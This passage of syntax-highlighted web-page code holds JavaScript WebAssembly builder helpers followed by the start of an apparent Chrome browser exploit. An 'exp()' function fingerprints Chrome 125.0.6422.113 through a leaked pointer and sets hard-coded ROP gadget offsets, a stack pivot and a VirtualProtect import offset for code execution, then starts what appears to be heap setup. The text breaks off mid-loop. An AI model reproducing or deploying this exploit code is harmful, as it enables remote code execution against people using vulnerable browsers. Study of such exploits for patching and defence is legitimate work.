class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span>debug<span class="token punctuation">)</span><span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> max_len <span class="token operator">=</span> <span class="token number">5</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Leb value may not be null/undefined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max_len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> v <span class="token operator">=</span> val <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>          <span class="token comment">// If &#123;v&#125; sign-extended from 7 to 32 bits is equal to val, we are done.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v <span class="token operator">&lt;&lt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">25</span> <span class="token operator">==</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> res<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          val <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>          <span class="token string">"Leb value &lt;"</span> <span class="token operator">+</span> val <span class="token operator">+</span> <span class="token string">"> exceeds maximum length of "</span> <span class="token operator">+</span> max_len        <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">wasmSignedLeb64</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> max_len <span class="token operator">=</span> <span class="token number">10</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Leb value may not be null/undefined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> val <span class="token operator">!=</span> <span class="token string">"bigint"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">&lt;</span> Math<span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> max_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          val <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max_len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> v <span class="token operator">=</span> val <span class="token operator">&amp;</span> <span class="token number">0x7fn</span><span class="token punctuation">;</span>          <span class="token comment">// If &#123;v&#125; sign-extended from 7 to 32 bits is equal to val, we are done.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>BigInt<span class="token punctuation">.</span><span class="token function">asIntN</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token operator">==</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> res<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          val <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">7n</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>          <span class="token string">"Leb value &lt;"</span> <span class="token operator">+</span> val <span class="token operator">+</span> <span class="token string">"> exceeds maximum length of "</span> <span class="token operator">+</span> max_len        <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> max_len <span class="token operator">=</span> <span class="token number">5</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Leb value many not be null/undefined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max_len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> v <span class="token operator">=</span> val <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">==</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> res<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          val <span class="token operator">=</span> val <span class="token operator">>>></span> <span class="token number">7</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>          <span class="token string">"Leb value &lt;"</span> <span class="token operator">+</span> val <span class="token operator">+</span> <span class="token string">"> exceeds maximum length of "</span> <span class="token operator">+</span> max_len        <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">wasmI32Const</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>kExprI32Const<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Note: Since &#123;val&#125; is a JS number, the generated constant only has 53 bits of</span>      <span class="token comment">// precision.</span>      <span class="token keyword">function</span> <span class="token function">wasmI64Const</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>kExprI64Const<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token function">wasmSignedLeb64</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">wasmF32Const</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Write in little-endian order at offset 0.</span>        data_view<span class="token punctuation">.</span><span class="token function">setFloat32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> f<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>          kExprF32Const<span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">wasmF64Const</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Write in little-endian order at offset 0.</span>        data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> f<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>          kExprF64Const<span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          byte_view<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">wasmS128Const</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Write in little-endian order at offset 0.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"S128Const needs 16 bytes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> kExprS128Const<span class="token punctuation">,</span> <span class="token operator">...</span>f<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> kExprS128Const<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> arguments<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>byte_view<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            data_view<span class="token punctuation">.</span><span class="token function">setFloat32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> arguments<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>byte_view<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>            <span class="token string">"S128Const needs an array of bytes, or two f64 values, "</span> <span class="token operator">+</span>              <span class="token string">"or four f32 values"</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>wasmBrOnCast<span class="token punctuation">,</span> wasmBrOnCastFail<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>          <span class="token punctuation">(</span><span class="token parameter">labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType</span><span class="token punctuation">)</span> <span class="token operator">=></span>            <span class="token function">wasmBrOnCastImpl</span><span class="token punctuation">(</span>labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">(</span><span class="token parameter">labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType</span><span class="token punctuation">)</span> <span class="token operator">=></span>            <span class="token function">wasmBrOnCastImpl</span><span class="token punctuation">(</span>labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">wasmBrOnCastImpl</span><span class="token punctuation">(</span><span class="token parameter">labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType<span class="token punctuation">,</span> brOnFail</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          labelIdx <span class="token operator">=</span> <span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span>labelIdx<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> srcHeap <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>sourceType<span class="token punctuation">.</span>heap_type<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> tgtHeap <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>targetType<span class="token punctuation">.</span>heap_type<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> srcIsNullable <span class="token operator">=</span> sourceType<span class="token punctuation">.</span>opcode <span class="token operator">==</span> kWasmRefNull<span class="token punctuation">;</span>          <span class="token keyword">let</span> tgtIsNullable <span class="token operator">=</span> targetType<span class="token punctuation">.</span>opcode <span class="token operator">==</span> kWasmRefNull<span class="token punctuation">;</span>          flags <span class="token operator">=</span> <span class="token punctuation">(</span>tgtIsNullable <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> srcIsNullable<span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token punctuation">[</span>            kGCPrefix<span class="token punctuation">,</span>            brOnFail <span class="token operator">?</span> kExprBrOnCastFailGeneric <span class="token operator">:</span> kExprBrOnCastGeneric<span class="token punctuation">,</span>            flags<span class="token punctuation">,</span>            <span class="token operator">...</span>labelIdx<span class="token punctuation">,</span>            <span class="token operator">...</span>srcHeap<span class="token punctuation">,</span>            <span class="token operator">...</span>tgtHeap<span class="token punctuation">,</span>          <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">function</span> <span class="token function">getOpcodeName</span><span class="token punctuation">(</span><span class="token parameter">opcode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> globalThis<span class="token punctuation">.</span>kWasmOpcodeNames<span class="token operator">?.</span><span class="token punctuation">[</span>opcode<span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string">"unknown"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Make a wasm export "promising" using JS Promise Integration.</span>      <span class="token keyword">function</span> <span class="token function">ToPromising</span><span class="token punctuation">(</span><span class="token parameter">wasm_export</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> sig <span class="token operator">=</span> wasm_export<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assertTrue</span><span class="token punctuation">(</span>sig<span class="token punctuation">.</span>parameters<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token string">"externref"</span><span class="token punctuation">,</span> sig<span class="token punctuation">.</span>parameters<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> wrapper_sig <span class="token operator">=</span> <span class="token punctuation">&#123;</span>          <span class="token literal-property property">parameters</span><span class="token operator">:</span> sig<span class="token punctuation">.</span>parameters<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token literal-property property">results</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"externref"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Function</span><span class="token punctuation">(</span>wrapper_sig<span class="token punctuation">,</span> wasm_export<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>          <span class="token literal-property property">promising</span><span class="token operator">:</span> <span class="token string">"first"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">function</span> <span class="token function">checkUA</span><span class="token punctuation">(</span><span class="token parameter">chrome_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>chrome_leak <span class="token operator">&amp;</span> <span class="token number">0xffffn</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xfd00n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            browser_type <span class="token operator">=</span> <span class="token string">"chrome"</span><span class="token punctuation">;</span>            browser_version <span class="token operator">=</span> <span class="token string">"125.0.6422.113"</span><span class="token punctuation">;</span>            base_leak_ofs <span class="token operator">=</span> <span class="token number">0xd39fd00n</span><span class="token punctuation">;</span>            base_tgt_ofs <span class="token operator">=</span> <span class="token number">0xd35ffb8n</span><span class="token punctuation">;</span>            fptr_xor <span class="token operator">=</span> <span class="token number">0xff000000000000n</span><span class="token punctuation">;</span>            pivot_gadget <span class="token operator">=</span> <span class="token number">0x895558en</span><span class="token punctuation">;</span>            pop_gadget <span class="token operator">=</span> <span class="token number">0x67620cn</span><span class="token punctuation">;</span>            prax_ret <span class="token operator">=</span> <span class="token number">0x6cd1n</span><span class="token punctuation">;</span>            jmp_drax <span class="token operator">=</span> <span class="token number">0x1d1e7n</span><span class="token punctuation">;</span>            virtualprotect_iat_ofs <span class="token operator">=</span> <span class="token number">0xd214850n</span><span class="token punctuation">;</span>            vtable_gadget <span class="token operator">=</span> <span class="token number">0x96b3672n</span><span class="token punctuation">;</span>            vtable_rax <span class="token operator">=</span> <span class="token number">0xd4dab30n</span><span class="token punctuation">;</span>            vtable_call_base <span class="token operator">=</span> <span class="token number">0xd3125e8n</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>browser_type <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[!] checkUA() fail!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] navigator.userAgent = "</span> <span class="token operator">+</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] chrome_leak = "</span> <span class="token operator">+</span> chrome_leak<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>              <span class="token string">"[+] checkUA() Browser: "</span> <span class="token operator">+</span>                browser_type<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>                browser_type<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span>                <span class="token string">" "</span> <span class="token operator">+</span>                browser_version            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">ms <span class="token operator">=</span> <span class="token number">50</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">hookLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">const</span> logTextarea <span class="token operator">=</span> window<span class="token punctuation">.</span>log<span class="token punctuation">;</span>          <span class="token keyword">const</span> ConsoleLog <span class="token operator">=</span> console<span class="token punctuation">.</span>log<span class="token punctuation">;</span>          console<span class="token punctuation">.</span>realLog <span class="token operator">=</span> ConsoleLog<span class="token punctuation">;</span>          console<span class="token punctuation">.</span><span class="token function-variable function">log</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            logTextarea<span class="token punctuation">.</span>value <span class="token operator">+=</span> args<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>            <span class="token function">ConsoleLog</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>console<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">hookLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] UA:"</span><span class="token punctuation">,</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> nogc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> abs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> absctr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span 